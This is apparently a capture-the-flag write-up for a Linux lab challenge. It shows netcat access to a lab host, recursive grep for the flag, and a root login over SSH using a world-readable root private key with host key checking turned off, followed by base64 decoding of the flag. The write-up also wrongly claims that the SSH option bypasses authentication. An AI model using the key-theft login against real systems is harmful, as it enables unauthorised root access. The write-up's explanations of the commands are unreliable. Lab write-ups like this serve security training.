# Linux 02
```bash
nc 192.168.10.7 9999
Where am I?
```

root `.ssh` folder is readable, [`id_rsa`](root_id_rsa) aswell

no success:
```bash
$ find / -type f -exec grep -Hn 'cyberctfd' {} \;
$ find / -type f -exec grep -Hn 'Y3liZXJj' {} \;
```

its not `cyberctfd{/home/ctf}`


no helpful env variables
```bash
$ printenv
USER=ctf
SHLVL=1
HOME=/home/ctf
OLDPWD=/home/ctf
PAGER=less
PS1=\h:\w\$ 
LOGNAME=ctf
LC_COLLATE=C
PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
LANG=C.UTF-8
SHELL=/bin/ash
PWD=/home/ctf
CHARSET=UTF-8
```
As its said before the content from root is readable so in there we have the id_rsa

i tried to ssh to the machine with his ip 192.168.10.7 
```bash
$ ssh root@192.168.10.7 -i id_rsa -o StrictHostKeyChecking=no 2>&1
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh: connect to host 192.168.10.7 port 22: Connection refused
````
The flag -o (options) StrictHostKeyChecking=no allow us to go throw the autentitaction
So instead of that i tried with the root@localhost instead and now you are connected it give a encrypted text now u just decrypt it
```bash
$ ssh root@192.168.10.7 -i id_rsa -o StrictHostKeyChecking=no
$ echo "Y3liZXJjdGZkezFuZDMzZF93aDNyM193NDVfMX0=" | base64 -d
cyberctfd{1nd33d_wh3r3_w45_1} 
```


